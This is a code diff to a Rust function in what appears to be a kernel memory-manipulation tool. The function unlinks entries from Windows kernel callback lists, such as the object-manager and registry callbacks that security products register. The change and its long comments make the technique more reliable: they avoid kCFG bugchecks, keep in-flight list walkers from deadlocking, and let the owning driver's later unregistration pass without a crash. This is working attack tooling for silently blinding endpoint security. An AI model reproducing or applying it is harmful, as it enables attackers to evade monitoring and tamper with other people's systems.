@@ -399,30 +399,45 @@ fn find_ob_callback_list_off(
 /// Detach a doubly-linked LIST_ENTRY node from its list without touching any
 /// function pointer that the kernel might later invoke.
 ///
+/// Only the NEIGHBORS' pointers get rewritten:
 ///   entry.Flink.Blink = entry.Blink
 ///   entry.Blink.Flink = entry.Flink
-///   entry.Flink        = entry   (self-loop → subsequent Remove is a no-op)
-///   entry.Blink        = entry
 ///
-/// This is kCFG-safe: nothing that survives on the entry is ever reached from
-/// the dispatcher's iteration, so no indirect call to a mutated pointer takes
-/// place. NULLing embedded function pointers, by contrast, bugchecks 0x139
-/// arg 0xA the moment kCFG-instrumented dispatch code reaches them.
+/// `entry.Flink` and `entry.Blink` are LEFT ALONE, pointing at their original
+/// (now-real, still-linked) neighbors. This is deliberate and important:
+///
+/// - A dispatcher starting from the list head never reaches `entry` because
+///   the neighbors' pointers now skip it.
+/// - A dispatcher that was ALREADY at `entry` when this unlink runs reads its
+///   unchanged Flink, advances to the successor, and continues normally. It
+///   calls `entry`'s callback one last time (harmless) but does not loop.
+///   Self-looping `entry.Flink = entry` would trap such an in-flight walker
+///   forever, deadlocking whatever kernel path was iterating — for the Ob
+///   process/thread lists that's `NtCreateUserProcess` firing during
+///   `CreateProcessW`, which then hangs indefinitely.
+/// - A later `CmUnRegisterCallback` / `ObUnRegisterCallbacks` from the owning
+///   driver does the standard `LIST_REMOVE(entry)`:
+///       entry.Flink.Blink = entry.Blink    ; already = entry.Blink (no-op)
+///       entry.Blink.Flink = entry.Flink    ; already = entry.Flink (no-op)
+///   No damage, no crash.
+///
+/// kCFG-safe throughout: no function pointer inside `entry` is mutated, so
+/// no indirect-call target is ever left in an invalid state.
 fn unlink_list_entry(
     drv: &Astra, cr3: u64, entry_va: u64,
 ) -> Result<(u64, u64), String> {
     let flink = vread_u64(drv, cr3, entry_va)?;
     let blink = vread_u64(drv, cr3, entry_va + 8)?;
+    // Rewrite neighbors first — this is what makes the entry unreachable from
+    // head-anchored walks. Do successor.Blink then predecessor.Flink so that
+    // if a walker races us via Flink they see a consistent forward chain the
+    // instant the predecessor is redirected.
     if is_kptr(flink) {
         vwrite(drv, cr3, flink + 8, &blink.to_le_bytes())?;
     }
     if is_kptr(blink) {
         vwrite(drv, cr3, blink, &flink.to_le_bytes())?;
     }
-    // Self-loop so that CmUnRegisterCallback / ObUnRegisterCallbacks called
-    // later by the owning driver sees an already-removed entry and no-ops.
-    vwrite(drv, cr3, entry_va,     &entry_va.to_le_bytes())?;
-    vwrite(drv, cr3, entry_va + 8, &entry_va.to_le_bytes())?;
     Ok((flink, blink))
 }
 
